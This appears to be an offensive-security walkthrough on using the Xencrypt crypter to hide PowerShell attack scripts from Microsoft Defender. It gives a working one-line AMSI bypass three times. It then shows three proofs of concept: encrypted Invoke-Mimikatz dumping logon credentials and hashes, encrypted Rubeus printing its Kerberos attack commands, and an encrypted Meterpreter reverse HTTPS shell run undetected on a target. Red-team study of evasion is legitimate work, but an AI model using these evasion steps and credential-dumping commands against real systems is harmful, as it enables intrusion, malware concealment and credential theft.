=========================================================================================================================================================
Simple AV bypass using the tool 'Xencrypt' (PowerShell crypter)
=========================================================================================================================================================

=> Source: https://github.com/the-xentropy/xencrypt

The objective is to use 'Xencrypt.ps1' to encrypt offensive PowerShell scripts to be able to copy them on the disk of a target Windows laptop or Windows server   
without having them being detected and deleted by the MS Defender AV (or other AV products).

Xencrypt allows to encrypt multiple times offensive PowerShell scripts (i.e. recursive layering = crypter crypting the crypted output).

Once encrypted, offensive PowerShell scripts such as "invoke-mimikatz.ps1" will not be detected by AntiVirus products (i.e. malware signature scan) when they 
will be downloaded or copied on a target. However they will still be detected at runtime by most AV's real time protection and/or sandbox checks. 
So before running an encrypted offensive PowerShell script, it will be necessary to bypass the Windows Antimalware Scan Interface (AMSI).


=========================================================================================================================================================
PoC 1 - Example with the script 'Invoke-mimkatz.ps1' encrypted 3 times and a Windows 10 laptop (fully patched with MS Defender AV enabled and up-to-date)
=========================================================================================================================================================

Step 1 - Encrypt the script 'Invoke-mimkatz.ps1' with 3 iterations of Xencrypt
----------------------------------------------------------------------------------

C:\Users\Administrator\Documents\Tools-AD>powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Administrator\Documents\Tools-AD> Import-Module ./xencrypt.ps1
At C:\Users\Administrator\Documents\Tools-AD\xencrypt.ps1:1 char:1
+ #    Xencrypt - PowerShell crypter
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS C:\Users\Administrator\Documents\Tools-AD> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)

PS C:\Users\Administrator\Documents\Tools-AD> Import-Module ./xencrypt.ps1

PS C:\Users\Administrator\Documents\Tools-AD> Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile C:\Users\Administrator\Desktop\invoke-encryptedm1m1.ps1 -Iterations 3

Xencrypt  Copyright (C) 2020  Xentropy ( @SamuelAnttila )
This program comes with ABSOLUTELY NO WARRANTY; for details type show w'.
This is free software, and you are welcome to redistribute it
under certain conditions.

[*] Reading 'invoke-mimikatz.ps1' ...
[*] Starting code layer  ...
[*] Compressing ...
[*] Generating encryption key ...
[*] Encrypting ...
[*] Finalizing code layer ...
[*] Starting code layer  ...
[*] Compressing ...
[*] Generating encryption key ...
[*] Encrypting ...
[*] Finalizing code layer ...
[*] Starting code layer  ...
[*] Compressing ...
[*] Generating encryption key ...
[*] Encrypting ...
[*] Finalizing code layer ...
[*] Writing 'C:\Users\Administrator.PO718687\Desktop\invoke-encryptedm1m1.ps1' ...
[+] Done!


=> I scanned the file generated (invoke-encryptedm1m1.ps1) with several antivirus (e.g. Defender, McAfee) and it was not detected.


Step 2 - Check that the encrypted 'invoke-mimkatz.ps1' is working properly by running it (after bypassing the AMSI)
---------------------------------------------------------------------------------------------------------------------

=> Note: The execution of 'invoke-mimkatz' is a bit slower than usual due to the 3 layers of encryption.

PS C:\Users\Administrator\Desktop> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
PS C:\Users\Administrator\Desktop> . .\invoke-encryptedm1m1.ps1
PS C:\Users\Administrator\Desktop> Invoke-Mimikatz                                                                                                                                  
PS C:\Users\Administrator.PO718687\Desktop> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 278910927 (00000000:109fd7cf)
Session           : Interactive from 5
User Name         : Administrator
Domain            : PO718687
Logon Server      : PO718687
Logon Time        : 31/10/2022 20:12:25
SID               : S-1-5-21-936125016-2310263949-2175806047-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : PO718687
         * NTLM     : 413eb6b2b7676dcf83d35b3eb<SNIP>
         * SHA1     : d92b88b5912ff7112ce3690ab<SNIP>
        tspkg :
<SNIP>

=========================================================================================================================================================
PoC 2 - Example with the script 'Invoke-rubeus.ps1' encrypted 2 times and a Windows 10 laptop (fully patched with MS Defender AV enabled and up-to-date)
=========================================================================================================================================================

Step 1 - Encrypt the script 'Invoke-rubeus.ps1' with 2 iterations of Xencrypt
----------------------------------------------------------------------------------

PS C:\Users\Administrator\Documents\Tools-AD> Invoke-Xencrypt -InFile invoke-rubeus.ps1 -OutFile C:\Users\Administrator\Documents\Tools-AD\invoke-encryptedRub3u3.ps1 -Iterations 2

Xencrypt  Copyright (C) 2020  Xentropy ( @SamuelAnttila )
This program comes with ABSOLUTELY NO WARRANTY; for details type show w'.
This is free software, and you are welcome to redistribute it
under certain conditions.

[*] Reading 'invoke-rubeus.ps1' ...
[*] Starting code layer  ...
[*] Compressing ...
[*] Generating encryption key ...
[*] Encrypting ...
[*] Finalizing code layer ...
[*] Starting code layer  ...
[*] Compressing ...
[*] Generating encryption key ...
[*] Encrypting ...
[*] Finalizing code layer ...
[*] Writing 'C:\Users\Administrator\Documents\Tools-AD\invoke-encryptedRub3u3.ps1' ...
[+] Done!


=> I scanned the file generated (invoke-encryptedRub3u3.ps1) with several antivirus (e.g. Defender, McAfee) and it was not detected.


Step 2 - Check that the encrypted 'invoke-rubeus.ps1' is working properly by running it (after bypassing the AMSI)
---------------------------------------------------------------------------------------------------------------------

PS C:\Users\Administrator\Documents\Tools-AD> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
PS C:\Users\Administrator\Documents\Tools-AD> . .\invoke-encryptedRub3u3.ps1
PS C:\Users\Administrator\Documents\Tools-AD> invoke-rubeus

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


 Ticket requests and renewals:

    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec]

    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec]

    Retrieve a TGT using a PCKS12 certificate, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]

    Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]

    Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:
        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/usesvcdomain]

    Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:
        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]

    Perform a Kerberos-based password bruteforcing attack:
        Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]

<SNIP>


=================================================================================================================================================================================
PoC 3 - Example with a x64 Meterpreter reverse https shell (.ps1) encrypted 2 times and a Windows 10 laptop (fully patched with MS Defender AV enabled and up-to-date)
=================================================================================================================================================================================

Step 1 - Generate a x64 Meterpreter reverse https shell in PowerShell format with the option 'psh-reflection'
--------------------------------------------------------------------------------------------------------------


Step 2 - Encrypt the powershell script containing the x64 Meterpreter reverse https shell with 2 iterations of Xencrypt
------------------------------------------------------------------------------------------------------------------------

PS C:\temp>  Invoke-Xencrypt -InFile C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-meterpreter-x64-reverse-https.ps1 -OutFile C:\temp\Invoke-meterpreter-x64-reverse-https-encrypted.ps1 -Iterations 2

Xencrypt  Copyright (C) 2020  Xentropy ( @SamuelAnttila )
This program comes with ABSOLUTELY NO WARRANTY; for details type show w'.
This is free software, and you are welcome to redistribute it under certain conditions.

[*] Reading 'C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-meterpreter-x64-reverse-https.ps1' ...
[*] Starting code layer  ...
[*] Compressing ...
[*] Generating encryption key ...
[*] Encrypting ...
[*] Finalizing code layer ...
[*] Starting code layer  ...
[*] Compressing ...
[*] Generating encryption key ...
[*] Encrypting ...
[*] Finalizing code layer ...
[*] Writing 'C:\temp\Invoke-meterpreter-x64-reverse-https-encrypted.ps1' ...
[+] Done!


Step 3 - AMSI bypass + Execution on a target Windows machine of the encrypted powershell script containing the x64 Meterpreter reverse https shell
---------------------------------------------------------------------------------------------------------------------------------------------------

PS C:\user\administrator> . .\Invoke-meterpreter-x64-reverse-https-encrypted.ps1

=> The MS Defender AV is neabled and up-to-date on the target Windows machine but it does not detect nor block the Meterpreter shell.


Step 4 - You hav now a meterpeter shell running 
-------------------------------------------------



